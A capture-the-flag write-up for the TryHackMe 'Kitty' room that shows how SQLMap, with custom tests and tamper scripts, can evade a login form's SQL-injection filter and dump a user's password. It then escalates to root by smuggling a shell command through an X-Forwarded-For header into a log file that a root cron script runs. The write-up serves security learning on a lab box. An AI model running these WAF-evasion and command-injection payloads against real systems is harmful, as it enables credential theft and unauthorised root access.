# Kitty - solving with SQLMap

https://tryhackme.com/room/kitty, rated Medium

I didn't get this the first time it was up, making some bad assumptions, but eventually when I had a go and discovered it was complex SQL injection, designed so that [SQLMap](https://github.com/sqlmapproject/sqlmap) would not be usable, I RESOLVED to figure out how to use SQLMap instead of custom scripting - this was not because custom scripting would be difficult, or not fun, but because finding edge cases where SQLMap won't work and then figuring out how to MAKE it work is a challenge on its own, and helps you learn the inner complexities of this complex and very useful tool.

## Initial Enumeration

An initial scan reveals 22 and 80. On the website, there is a login page at index.php, a register.php page, and once you login an information-less welcome.php and a link to logout.php. Two features become apparent with additional testing:

  - the login form will report 'SQL Injection detected. This incident will be logged!' if you use ` or ` in one of the form fields.
  - the register form will report if a username has already been used. by leveraging this with a brute forcing tool like ffuf you can discover that the username 'kitty' already exists

Despite the login forms filter (or perhaps *because* of it) trying different SQL injection payloads will eventually reveal you can bypass the login with a username like `' union select 1,2,3,4 -- `. However, welcome.php continued to have nothing useful. Knowing that their is a user named `kitty`, and SSH is open, the path forward appeared to be (correctly) that getting the user's site password might work over SSH.

## Getting SQL Map to work

0. In order to solve this we will need some tamper scripts only available with the latest versions of SQLMap (not the default on the attackbox). So best to grab the latest and use `python3 sqlmap.py` rather than the built in `sqlmap`: `git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev`. The version I used was `1.8.2#stable`.

> Additionally, I created a user **test** and **test11**, to use as a valid positive (this works with the inference that sql map users, which will be something like 'select password where username = test and inference'.

1. To start, with SQLMap we can use an existing request or a URL with some flags. This is basically preference, but for clarity I will use the latter option:

    `python3 sqlmap.py -u http://10.10.140.235/index.php --forms`

2. Further experimentation will reveal the database as MySQL (determined by some query options not being evaluated etc) so to simplify things you can append `--dbms=mysql -p username` to both restrict to MySQL and just focus on the username field. Additionally `--skip-heuristic` will cut back noise, as we already know this field is vulnerable (and SQLMap will think it isn't). Finally, because there is a session cookie that won't change when a successful bypass executes, and which sql map by default adopts, we need to ignore the set-cookie flag: `--drop-set-cookie`:

    `python3 sqlmap.py -u http://10.10.140.235/index.php --forms --dbms=mysql -p username --skip-heuristic --drop-set-cookie`

3. Next step is identifying the type of injection this is. As there is no feedback to the user in terms of returned content, its a 'blind injection' (`--technique=B`), as long as we can get some sort of true or false difference between responses. In this case, false returns a 200 code (invalid username or password) while true redirects with 302: `--code=302` will tell SQLMap to treat 302's as a success message.

    `python3 sqlmap.py -u http://10.10.140.235/index.php --forms --dbms=mysql -p username --skip-heuristic --drop-set-cookie --technique=B --code=302`

4. In a normal situation, most of the above (except `-u` and `--forms`) probably wouldn't be necessary, but we want to cut the noise down and get results quick because investigation of the SQL Injection filter is trial and error. To test specifically I created a custom test, and specified it using `--test-filter=kitty`: the following was added to `data/xml/payloads/boolean_blind.xml`:

   ```xml
   <test>
        <title>CUSTOM kitty blind</title>
        <stype>1</stype>        <!-- boolean-based -->
        <level>1</level>        <!-- run always -->
        <risk>1</risk>                  <!-- low risk -->
        <clause>0</clause>      <!-- no conditions -->
        <where>3</where>        <!-- replace original value -->
        <vector>test' AND [INFERENCE] -- </vector>   <!-- once detected, how to exploit -->
        <request>
            <payload>test' AND 1=1 -- </payload>       <!-- test to see if it worked -->
        </request>
        <response>
            <comparison>badtest</comparison>   <!-- compare to to see if it failed (nothing) -->
        </response>
        <details>
            <dbms>MySQL</dbms>  <!-- target database -->
        </details>
    </test>
   ```

   By using this test, we *know* it will be exploitable.

5. Finally, to debug what the waf filter is, we specify `-v 3` through to `-v 5` as needed: this will print out the post data used, and what is returned (when v=5). Final query for testing is something like:

    `python3 sqlmap.py -u http://10.10.140.235/index.php --forms --dbms=mysql -p username --skip-heuristic --drop-set-cookie --technique=B --code=302 --test-filter=kitty -v 5`

   Through the above we can see when calls return with `SQL Injection detected...`. Taking these queries, e.g. 

    `test' UNION SELECT 1,2,3,4 WHERE ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR)),0x20,CAST(DATABASE() AS NCHAR)),1,1))>127 --`

   We can put this into burp suite or similar, and modify it until the error goes away. In the above, three things trigger the error: `ORD` as it contains OR presumably, `0x20` (or any other 0x character) and `IFNULL`.

6. So how to fix this? Fortunately, SQLMap has a thing called 'tamper scripts', which you can see here: https://github.com/sqlmapproject/sqlmap/tree/master/tamper. These can be specified by script name with `--tamper`. And fortunately there are three that solve the specific problems above:

    - `hex2char.py` replaces `0x20` with `Char(32)`
    - `ifnull2ifisnull.py` replaces `IFNULL()` with `IF(ISNULL(),)`
    - `ord2ascii.py` replaces `ORD` with `ASCII`

    With these three tamper scripts, specified `--tamper=ord2ascii,ifnull2ifisnull,hex2char` we can effectively avoid the WAF filter the site has.

Now all these pieces are in place, the injection is possible with SQLMap! In fact, the final query can be simplified and doesn't require the above custom test:

  `python3 sqlmap.py -u http://10.10.140.235/index.php --forms --dbms=mysql -p username --code=302 --dump --tamper=ord2ascii,ifnull2ifisnull,hex2char --skip-heuristic --drop-set-cookie --flush-session`

(Here `--flush-session` doesn't used any cached tests, and can be useful to ignore any remnants from experiments)

The above query will reveal the kitty user's password, which works over SSH :) 

> When it runs SQLMap will ask you a number of questions. Most of them will be fine with defaults, except you dont want to follow redirects and you need to edit the form field values to include the valid username and password created earlier. For reference, here are the questions and the answers:
> - do you want to test this form? Y
> - Edit POST data [default: username=&password=] (Warning: blank fields detected): username=test&password=test11
> - got a 302 redirect to 'http://10.10.229.44/welcome.php'. Do you want to follow? n
> - are you sure that you want to continue with further target testing? Y
> - do you want to (re)try to find proper UNION column types with fuzzy test? N
> - injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? Y
> - POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? N
> - do you want to exploit this SQL injection? Y

## Privesc to root

The focus of this writeup is getting SQLMap working, but I'll finish with the root privesc. The pieces required from local enumeration are as follows:

- there are two sites on the box, both under /var/www. They are identical, though one which is only accessible internally at localhost:8080 does the following when SQL Injection is detected:
    ```php
    if (preg_match( $evilword, $username )) {
        echo 'SQL Injection detected. This incident will be logged!';
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        $ip .= "\n";
        file_put_contents("/var/www/development/logged", $ip);
        die();
    }
    ```
    notably, `/var/www/development/logged` is not writable by the kitty user, so going via the website's logging system is the only option.
- on the box you can also find `/opt/log_checker.sh`. The contents of this are:

    ```bash
    #!/bin/sh
    while read ip;
    do
      /usr/bin/sh -c "echo $ip >> /root/logged";
    done < /var/www/development/logged
    cat /dev/null > /var/www/development/logged
    ```
- finally, by bringing over [pspy64](https://github.com/DominicBreuker/pspy) or similar you can observe that root runs `/bin/sh -c /usr/bin/bash /opt/log_checker.sh`, presumably as part of a cronjob.

The solution is by putting some command injection into the log file, e.g. `; cp /bin/sh /tmp/sh && chmod u+s /tmp/sh;` which will create a suid `sh` copy. This can be done in the local kitty session witha  curl command like: `curl -X POST -H "X-Forwarded-For: ; cp /bin/sh /tmp/sh && chmod u+s /tmp/sh;" -d "username=+or+&password=test" localhost:8080` - this triggers the injection waf and puts the command in the log file, which then gets executed and creates a suid binary you can use to jump to root with `/tmp/sh -p` :)
